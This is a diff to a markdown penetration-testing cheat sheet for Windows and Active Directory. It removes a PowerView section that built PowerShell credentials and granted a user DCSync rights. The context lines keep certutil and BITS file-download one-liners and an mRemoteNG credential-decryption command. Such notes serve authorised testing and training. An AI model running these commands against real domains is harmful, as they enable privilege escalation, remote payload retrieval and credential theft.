@@ -63,30 +63,6 @@ Start-BitsTransfer -Source <url> -Destination <output_file>
 certutil -urlcache -f <url> output_file<>
 ```
 
-## PowerView
-**[Code](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)**     
-**Make credentials**
-```powershell
-# Set password
-$SecPassword = ConvertTo-SecureString <password> -AsPlainText -Force
-
-# Convert password and username into credentials object
-$Cred = New-Object System.Management.Automation.PSCredential('domain\user', $SecPassword) 
-```
-
-**Give user DCSync rights**
-```powershell
-# Set password
-$SecPassword = ConvertTo-SecureString <password> -AsPlainText -Force
-
-# Convert password and username into credentials object
-$Cred = New-Object System.Management.Automation.PSCredential('domain\user', $SecPassword) 
-
-# Give user DCSync rights
-Add-ObjectAcl -Credential $Cred -TargetIdentity "dc=domain,dc=local" -PrincipalIdentity <user> -Rights DCSync
-```
-
-
 
 # Directories to check
 ```bash
@@ -250,7 +226,6 @@ One can use **[mremoteng-decrypt](https://github.com/kmahyyg/mremoteng-decrypt)*
 ```bash
 python3 mremoteng_decrypt.py -s <string>
 ```
-)
 
 # Analyse office files
 Modern `Office` documents are just zip archives with XML files so, just unzip it and look for data within the XML files.
